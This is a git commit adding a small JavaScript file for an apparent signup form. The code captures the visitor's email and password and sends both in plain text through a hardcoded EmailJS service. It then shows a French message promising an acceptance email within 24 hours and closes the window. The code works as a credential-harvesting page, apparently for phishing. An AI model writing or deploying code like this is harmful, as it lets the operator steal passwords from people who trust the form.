1b99fbbe425a179bdda7afb328748b54e6888845
maxbelhomme <sam.cantin@outlook.com>
2025-04-27 18:40:54 -0400

    Add files via upload

---
+++ script.js
@@ -0,0 +1,22 @@
+(function() {
+  emailjs.init('DhsaxmPbH-NOyADwe'); // Remplacer TON_USER_ID par votre ID EmailJS
+})();
+
+document.getElementById('signup-form').addEventListener('submit', function(event) {
+  event.preventDefault();
+
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+
+  emailjs.send('service_1e9p5on', '__ejs-test-mail-service__', {
+    from_email: email,
+    password: password
+  })
+  .then(function() {
+    alert("Merci! Vous recevrez un message d'acceptation via courriel d'ici 24h.");
+    window.close();
+  }, function(error) {
+    alert("Erreur: veuillez réessayer plus tard.");
+    console.error('Erreur:', error);
+  });
+});
